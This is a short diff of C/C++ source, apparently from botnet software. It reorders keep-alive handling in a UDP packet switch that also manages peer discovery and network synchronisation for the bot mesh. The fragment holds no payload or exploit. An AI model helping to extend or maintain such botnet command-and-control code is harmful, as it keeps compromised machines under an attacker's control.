@@ -202,15 +202,14 @@ static int handle_udp_connections()
 		break;
 	case PACK_TYPE::SYNC_REPLY:
 		break;
-	case PACK_TYPE::KEEP_ALIVE:
-		keep_alive_reply(client);
-		break;
 	case PACK_TYPE::PEER_REPLY:
 		botnet_topology.addPeer(data, udp_sock);
 		break;
 	case PACK_TYPE::NETWORK_SYNC:
 		botnet_topology.handleSync(data, client);
 		break;
+	case PACK_TYPE::KEEP_ALIVE:
+		keep_alive_reply(client);
 	default:
 		return 0;
 	}
